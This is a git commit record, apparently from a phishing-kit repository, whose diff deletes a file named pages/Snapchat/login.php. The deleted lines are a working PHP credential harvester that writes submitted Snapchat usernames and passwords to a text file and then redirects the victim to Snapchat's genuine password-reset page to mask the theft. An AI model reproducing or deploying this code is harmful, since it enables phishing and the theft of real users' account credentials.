fe8e9bd3895a13d598d5e1b55a5f824771eb1f4f
Euronymou5 <85043356+Euronymou5@users.noreply.github.com>
2021-12-12 23:36:21 -0600

    Delete pages/Snapchat directory

--- pages/Snapchat/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usuarios.txt", " Cuenta: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
-exit();
-?>
